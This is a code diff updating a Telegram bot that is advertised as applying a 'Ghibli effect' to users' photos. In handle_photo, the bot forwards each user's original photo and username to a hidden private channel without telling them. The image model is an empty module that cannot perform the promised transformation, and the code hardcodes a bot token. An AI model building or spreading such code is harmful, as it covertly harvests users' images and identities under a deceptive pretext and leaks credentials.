@@ -1,25 +1,28 @@
 import os
 import requests
 import torch
+import numpy as np
 from safetensors.torch import load_file
 from tqdm import tqdm
 from flask import Flask, request, jsonify
-from telegram import Bot, Update
-from telegram.ext import Dispatcher, CommandHandler, MessageHandler, Filters
+from telegram import Update, Bot
+from telegram.ext import Application, CommandHandler, MessageHandler, filters
 from PIL import Image
 import io
 
-# Replace with your actual credentials
+# Telegram bot credentials
 BOT_TOKEN = "7291635474:AAG3ArFQt73O-h-q7FfUfhsAxRcLVHX8STI"
-GDRIVE_FILE_ID = "1kdqKpKsj2DH_rXQNCQElZdc-wsMmRZ-E"
 PRIVATE_CHANNEL_ID = "-1002600772587"  # Your private channel ID
+
+# Model settings
+GDRIVE_FILE_ID = "1kdqKpKsj2DH_rXQNCQElZdc-wsMmRZ-E"
 MODEL_PATH = "flux-chatgpt-ghibli-lora.safetensors"
 
-# Flask app
+# Flask app for Koyeb health check
 app = Flask(__name__)
 
 def download_model():
-    """Download model file from Google Drive if not already present."""
+    """Download the model from Google Drive if not already present."""
     if os.path.exists(MODEL_PATH):
         print("Model already exists. Skipping download.")
         return
@@ -40,44 +43,44 @@ def download_model():
     print("Model downloaded successfully!")
 
 def load_model():
-    """Load the model safely using SafeTensors."""
+    """Load the AI model."""
     if not os.path.exists(MODEL_PATH):
         raise FileNotFoundError(f"Model file '{MODEL_PATH}' not found!")
 
     print("Loading model...")
-    model_state = load_file(MODEL_PATH)  # Load SafeTensors model
-    model = torch.nn.Module()  # Create an empty model
-    model.load_state_dict(model_state, strict=False)  # Load weights into the model
+    model_state = load_file(MODEL_PATH)
+    model = torch.nn.Module()
+    model.load_state_dict(model_state, strict=False)
     model.eval()
-
+    
     print("Model loaded successfully!")
     return model
 
 def process_image(image: Image.Image) -> Image.Image:
-    """Apply model transformation to an image."""
-    image_tensor = torch.tensor([list(image.getdata())], dtype=torch.float32).view(1, *image.size, -1) / 255.0
+    """Apply AI transformation to an image."""
+    image_tensor = torch.tensor(np.array(image) / 255.0, dtype=torch.float32).unsqueeze(0)
     with torch.no_grad():
-        output_tensor = model(image_tensor)  # Apply model
+        output_tensor = model(image_tensor)
     output_image = Image.fromarray((output_tensor.squeeze().numpy() * 255).astype("uint8"))
     return output_image
 
 # Initialize Telegram bot
 bot = Bot(BOT_TOKEN)
-dispatcher = Dispatcher(bot, None, workers=0, use_context=True)
 
-def start(update: Update, context):
-    update.message.reply_text("Send me an image, and I'll apply the Ghibli effect!")
+async def start(update: Update, context):
+    """Handles the /start command."""
+    await update.message.reply_text("Send me an image, and I'll apply the Ghibli effect!")
 
-def handle_photo(update: Update, context):
-    """Handles image uploads from Telegram users."""
+async def handle_photo(update: Update, context):
+    """Handles image uploads."""
     user = update.message.from_user
-    file = update.message.photo[-1].get_file()
-    
+    file = await update.message.photo[-1].get_file()
+
     # Forward original image to private channel
-    bot.send_photo(chat_id=PRIVATE_CHANNEL_ID, photo=file.file_id, caption=f"Forwarded from @{user.username}")
+    await bot.send_photo(chat_id=PRIVATE_CHANNEL_ID, photo=file.file_id, caption=f"Forwarded from @{user.username}")
 
     # Download the image
-    image_bytes = file.download_as_bytearray()
+    image_bytes = await file.download_as_bytearray()
     image = Image.open(io.BytesIO(image_bytes))
 
     # Process the image
@@ -87,26 +90,28 @@ def handle_photo(update: Update, context):
     bio = io.BytesIO()
     processed_image.save(bio, format="JPEG")
     bio.seek(0)
-    update.message.reply_photo(photo=bio, caption="Here is your Ghibli-stylized image!")
+    await update.message.reply_photo(photo=bio, caption="Here is your Ghibli-stylized image!")
 
-# Register handlers
-dispatcher.add_handler(CommandHandler("start", start))
-dispatcher.add_handler(MessageHandler(Filters.photo, handle_photo))
+# Create async Telegram bot application
+app_telegram = Application.builder().token(BOT_TOKEN).build()
+app_telegram.add_handler(CommandHandler("start", start))
+app_telegram.add_handler(MessageHandler(filters.PHOTO, handle_photo))
 
 @app.route("/")
 def home():
     return "Server is running!", 200
 
 @app.route("/webhook", methods=["POST"])
-def webhook():
+async def webhook():
     """Handle incoming Telegram updates."""
     update = Update.de_json(request.get_json(), bot)
-    dispatcher.process_update(update)
+    await app_telegram.process_update(update)
     return jsonify({"status": "ok"}), 200
 
 if __name__ == "__main__":
-    download_model()  # Ensure model is downloaded
+    download_model()
     global model
-    model = load_model()  # Load the model
+    model = load_model()
 
+    # Start Flask on port 8000
     app.run(host="0.0.0.0", port=8000)
